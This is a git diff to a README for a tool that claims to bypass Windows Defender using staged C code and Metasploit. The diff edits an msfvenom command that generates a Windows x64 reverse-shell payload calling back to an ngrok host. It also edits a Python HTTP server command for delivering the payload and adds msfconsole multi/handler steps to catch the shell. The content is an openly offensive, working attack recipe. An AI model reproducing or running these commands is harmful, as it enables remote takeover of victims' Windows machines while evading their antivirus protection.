@@ -31,12 +31,12 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 
 - Create the .bin payload using msfvenom 
   ```
-   - msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
   ```
 
 - Launch a Python HTTP server in the same directory where the payload is located 
   ```
-   - python -m http.server 8090
+    python -m http.server 8090
   ```
 
 - Create the serveo key and expose python server using a serveo tunnel
@@ -53,3 +53,15 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 <p align="start">
    <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/command_variable.png">
 </p>
+
+##
+
+- Setting up msfconsole
+```
+   msfconsole
+   use exploit multi/handler
+   set payload windows/x64/shell_reverse_tcp
+   set LHOST <LOCAL IP>
+   set LPORT 4444
+   exploit
+```
